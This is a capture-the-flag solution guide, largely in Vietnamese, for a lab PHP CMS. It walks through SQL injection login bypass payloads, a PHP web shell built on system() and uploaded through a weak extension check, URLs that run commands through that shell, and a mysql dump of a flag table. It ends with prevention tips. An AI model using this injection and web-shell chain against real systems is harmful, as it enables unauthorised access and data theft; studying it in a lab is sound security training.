# Challenge 1 Solution Guide

## Vulnerability Chain

Để đạt được RCE và đọc flag, cần chain các lỗ hổng sau:

1. **SQL Injection** trong login → Bypass authentication hoặc đọc thông tin từ database
2. **File Upload** → Upload PHP shell
3. **Path Traversal** → Access uploaded shell
4. **IDOR** → Có thể cần để access files của user khác
5. **Business Logic** → Privilege escalation để access admin panel

## Step-by-Step Exploitation

### Step 1: SQL Injection trong Login

File `login.php` có SQL injection:

```php
$query = "SELECT id, username, password, role FROM users WHERE username = '" . $username . "' AND password = '" . md5($password) . "'";
```

**Exploit:**
- Username: `admin' OR '1'='1' -- `
- Password: `anything`

Hoặc để đọc thông tin từ database:
- Username: `admin' UNION SELECT 1,2,3,4 -- `
- Password: `anything`

**Payload để bypass và login as admin:**
```
Username: admin' OR '1'='1' -- 
Password: test
```

### Step 2: Upload PHP Shell

Sau khi login, sử dụng chức năng upload file. File `upload.php` chỉ check extension, không validate MIME type hoặc file content.

**Tạo PHP shell (shell.php):**
```php
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

Upload file này với tên `shell.php`. File sẽ được lưu tại: `uploads/{user_id}/shell.php`

### Step 3: Access Shell via Path Traversal

File `download.php` có IDOR và path traversal. Tuy nhiên, để access shell, có thể:

**Option 1:** Truy cập trực tiếp qua URL:
```
http://localhost:8080/uploads/{user_id}/shell.php?cmd=id
```

**Option 2:** Sử dụng download.php với path traversal nếu có thể:
```
http://localhost:8080/download.php?id=1
```

### Step 4: RCE và Đọc Flag

Sau khi có RCE, có thể:

1. **Đọc flag từ database:**
```bash
# Via shell
http://localhost:8080/uploads/1/shell.php?cmd=mysql -u cms_user -pcms_pass cms_db -e "SELECT secret_flag FROM flags"

# Hoặc sử dụng PHP
http://localhost:8080/uploads/1/shell.php?cmd=php -r "echo file_get_contents('php://stdin');" < /dev/stdin
```

2. **Hoặc access admin panel:**
   - Nếu có thể modify session để set role = 'admin'
   - Hoặc sử dụng SQL injection để login as admin user
   - Sau đó access `/admin.php` để đọc flag

### Alternative: Direct Admin Access

Nếu exploit SQL injection để login as admin ngay từ đầu:
1. Login với SQL injection as admin
2. Access `/admin.php` trực tiếp
3. Đọc flag từ admin panel

## Exploit Script

Xem `exploit.py` trong thư mục này.

## Key Learning Points

1. **SQL Injection**: Direct string concatenation trong SQL queries
2. **File Upload**: Chỉ check extension, không validate file content
3. **Path Traversal**: Không validate filepath trong download
4. **IDOR**: Check user_id nhưng có thể bypass
5. **Business Logic**: Role check từ session, không từ database

## Prevention

1. Sử dụng prepared statements cho SQL queries
2. Validate file upload: MIME type, file content, whitelist extensions
3. Validate và sanitize file paths
4. Check authorization từ database, không từ session
5. Implement proper access control

